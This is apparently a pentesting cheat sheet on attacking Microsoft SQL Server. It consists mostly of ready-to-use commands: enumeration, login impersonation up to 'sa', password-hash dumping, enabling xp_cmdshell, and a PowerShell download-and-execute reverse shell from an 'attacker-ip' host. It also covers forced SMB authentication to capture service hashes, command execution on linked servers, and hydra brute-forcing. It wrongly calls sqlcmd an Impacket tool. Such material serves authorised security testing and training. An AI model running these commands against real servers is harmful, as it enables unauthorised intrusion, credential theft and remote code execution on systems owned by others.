**Microsoft SQL Server** (MSSQL) is a common target in penetration testing due to misconfigurations, weak credentials, and privilege escalation opportunities. This cheat sheet provides enumeration techniques, privilege escalation methods, and exploitation tactics useful for pentesters and red teamers.

---

## 1. Connecting to MSSQL

- **Using** `sqsh` **(Linux)**
Connects to an MSSQL server using a specified username and password.

```bash
sqsh -S target-ip -U user -P password
```


- **Using** `impacket-mssqlclient`
Connects to MSSQL using Impacket’s `mssqlclient.py`.

```bash
python3 mssqlclient.py DOMAIN/user:password@target-ip
```

> If you are targetting a local account, you can use `SERVERNAME\\accountname` or `.\\accountname`. 

- **Using PowerShell (Windows)**
Connects to MSSQL using Impacket’s `sqlcmd`.
```bash
sqlcmd -S target-ip -U user -P password
```

If you have access to the machine where the DB is allocated, you can interact with it without creating an interactive shell.

```powershell
sqlcmd -S .\SQLEXPRESS -E -Q "SELECT * FROM CredentialsDB.dbo.Credentials"
```


---

## 2. Enumerating MSSQL
- **List all databases**:

```sql
SELECT name FROM sys.databases;
```

- **Switch to a database**:

```sql
USE <database_name>;
```

- **List all tables**:

```sql
SELECT * FROM information_schema.tables;
```

- **List all users**:

```sql
SELECT name FROM sys.syslogins;
```

- **Connect as other listed user**:

```bash
select system_user # Verify the actual user is enabled
execute as login = 'user'
select system_user # Verify the selected user is enabled
``` 
- **Query all data from a table**:

```sql
SELECT * FROM <table_name>;
```

- **Check if `xp_cmdshell` is enabled**:

```sql
EXEC sp_configure 'xp_cmdshell';
```

- **Enable `xp_cmdshell` (if permissions allow)**:

```sql
enable_xp_cmdshell;
```

- **Execute system command**:

```sql
EXEC xp_cmdshell 'whoami';
```



---

## 3. Credential Hunting & Privilege Escalation

- **Enumerate local users**

Retrives the machine local users using mssql.

```bash
nxc mssql <target> -u <user> -p <password> --rid-brute 10000 --local-auth
```

- **User Impersonation**

This command verifies whether the current user has permission to perform privilege escalation using the `mssql_priv` module of NetExec.

```bash
nxc mssql <target_ip> -u <user> -p <password> -M mssql_priv --local-auth
```

In the output, it will show us which user can be impersonated if impersonation is possible. Then, to perform the escalation, you can use:

```bash
EXECUTE AS LOGIN = '<target_user>';
```

This command impersonates the sysadmin user:
```bash
EXECUTE AS LOGIN = 'sa';SELECT SYSTEM_USER;SELECT IS_SRVROLEMEMBER('sysadmin');
```

- **Finding Stored Credentials**

Retrieves stored password hashes (if accessible).

```powershell
SELECT name, password_hash FROM sys.sql_logins;
```


- **Enabling** `xp_cmdshell` **for Command Execution**

Enables `xp_cmdshell` to execute system commands.

```powershell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

Runs system commands with MSSQL privileges.

```powershell
EXEC xp_cmdshell 'whoami';
# Executes a PowerShell-based reverse shell.
EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/rev.ps1')"';
```

- **Capturing MSSQL Service Hash**

Force MSSQL to authenticate to attacker's SMB share

```powershell
# Start Responder on attacker machine
sudo responder -I eth0

# On MSSQL
EXEC xp_dirtree '\\attacker-ip\share';
EXEC xp_fileexist '\\attacker-ip\share\file';

# Or using xp_subdirs
EXEC master..xp_subdirs '\\attacker-ip\share';
```

- **Abusing MSSQL Linked Servers**

MSSQL supports **linked servers**, which allow one SQL Server instance to execute queries against another database server (SQL Server, Oracle, etc.).

Lists linked servers (potential pivoting points).

```
EXEC sp_linkedservers;
```

Run commands on a linked MSSQL server:

```
EXEC ('whoami') AT linked_server_name;
```

---

## 4. Brute-Forcing MSSQL Credentials

- **Using** `hydra`

Attempts brute-force login.

```bash
hydra -L users.txt -P passwords.txt mssql://target-ip
```

